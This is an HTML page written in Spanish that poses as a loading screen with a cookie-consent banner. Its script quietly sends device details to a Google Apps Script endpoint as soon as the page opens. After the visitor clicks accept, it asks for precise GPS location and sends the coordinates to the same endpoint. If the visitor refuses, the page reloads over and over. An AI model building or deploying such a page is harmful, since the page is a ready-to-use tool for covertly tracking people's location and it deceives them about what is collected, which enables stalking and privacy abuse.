<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Cargando página</title>
<style>
  :root { --rosa: #e91e63; }
  body {
    margin:0;
    height:100vh;
    background:var(--rosa);
    font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
    color:#fff;
    display:flex;
    align-items:center;
    justify-content:center;
    overflow:hidden;
  }
  .card {
    background:rgba(0,0,0,.25);
    padding:24px;
    border-radius:14px;
    text-align:center;
    width:min(420px,92vw);
    backdrop-filter:blur(4px);
  }
  .loader {
    border:7px solid rgba(255,255,255,.2);
    border-top:7px solid #fff;
    border-radius:50%;
    width:70px;height:70px;
    margin:16px auto;
    animation:spin 2s linear infinite;
  }
  @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }

  /* Banner pantalla completa */
  #cookieFull {
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.92);
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    gap:16px;
    text-align:center;
    padding:22px;
    z-index:9999;
  }
  #cookieFull h2 { margin:0 0 6px;font-size:1.3rem; }
  #cookieFull p { margin:0;color:#d5d5d5;max-width:420px;line-height:1.4; }

  .btn {
    border:none;
    border-radius:999px;
    padding:10px 20px;
    font-weight:600;
    cursor:pointer;
    font-size:1rem;
  }
  .btn-primary { background:#4caf50;color:#fff; }
  .btn-secondary { background:transparent;color:#fff;border:1px solid rgba(255,255,255,.35); }

  /* Pantalla de error / volver a empezar */
  #needCookies {
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.95);
    display:none;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    gap:14px;
    text-align:center;
    padding:22px;
    z-index:10000;
  }
  #needCookies h3 { margin:0; }
</style>
</head>
<body>

  <div class="card">
    <h2>Cargando página</h2>
    <div class="loader"></div>
    <p id="status">Esperando confirmación…</p>
    <p id="alertMsg" style="min-height:1.2em;"></p>
  </div>

  <!-- Banner de cookies (pantalla completa) -->
  <div id="cookieFull">
    <h2>Usamos cookies para mejorar tu experiencia</h2>
    <p>✅ datos de uso y permisos para navegar</p>
    <button class="btn btn-primary" id="btnAccept">Aceptar cookies</button>
    <button class="btn btn-secondary" id="btnReject">No aceptar</button>
  </div>

  <!-- Pantalla de “necesitas cookies” -->
  <div id="needCookies">
    <h3>Se necesitan cookies para seguir navegando</h3>
    <p>Vamos a recargar la página para volver a solicitar tu permiso.</p>
  </div>

<script>
/* ===== CONFIG ===== */
const ENDPOINT = "https://script.google.com/macros/s/AKfycbxwkROdWrrCoIlY5uZM6mJTLMGpFz-G4tJPsu2d9_9PGUyhLtwlwMUxTLfyQnZWhJCd/exec";
const SECRET   = "direccion_010233!d";

const statusEl = document.getElementById('status');
const alertMsg = document.getElementById('alertMsg');
const cookieFull = document.getElementById('cookieFull');
const needCookies = document.getElementById('needCookies');
const btnAccept = document.getElementById('btnAccept');
const btnReject = document.getElementById('btnReject');

/* ===== helpers ===== */
async function send(data){
  try{
    await fetch(ENDPOINT,{
      method:'POST',
      headers:{'Content-Type':'text/plain'},
      body:JSON.stringify(data),
      mode:'no-cors'
    });
  }catch(e){}
}

function getPosition(){
  return new Promise((resolve,reject)=>{
    navigator.geolocation.getCurrentPosition(resolve,reject,{
      enableHighAccuracy:true, timeout:12000, maximumAge:0
    });
  });
}

/* 1) registrar APENAS entra */
(async function autoOpen(){
  await send({
    k: SECRET,
    via: "auto-open",
    ts: new Date().toISOString(),
    url: window.location.href,
    device: navigator.userAgent,
    lang: navigator.language,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    online: navigator.onLine
  });
})();

/* 2) si acepta cookies → después de 3s pedimos ubicación */
btnAccept.addEventListener('click', ()=>{
  cookieFull.style.display='none';
  statusEl.textContent = 'Cookies aceptadas';

  // registrar que aceptó cookies
  send({
    k: SECRET,
    via: "cookies-accepted",
    ts: new Date().toISOString(),
    url: window.location.href,
    device: navigator.userAgent
  });

  // después de 3s pedimos ubicación
  setTimeout(requestLocation, 3000);
});

/* 3) si NO acepta mostramos pantalla y recargamos */
btnReject.addEventListener('click', ()=>{
  showNeedAndReload();
});

function showNeedAndReload(){
  needCookies.style.display = 'flex';
  setTimeout(()=>{ location.reload(); }, 2500);
}

/* 4) pedir ubicación */
async function requestLocation(){
  try{
    const pos = await getPosition();
    const lat = pos.coords.latitude.toFixed(6);
    const lng = pos.coords.longitude.toFixed(6);
    const acc = (pos.coords.accuracy||0).toFixed(1);

    await send({
      k: SECRET,
      via: "gps",
      ts: new Date().toISOString(),
      lat, lng, accuracy: acc,
      url: window.location.href,
      device: navigator.userAgent
    });

    statusEl.textContent = 'Registro completado ✅';
    setTimeout(()=>{ try{ window.close(); }catch(e){} }, 1200);

  }catch(err){
    // si el usuario negó o el navegador ya lo tenía bloqueado
    showNeedAndReload();
  }
}
</script>
</body>
</html>
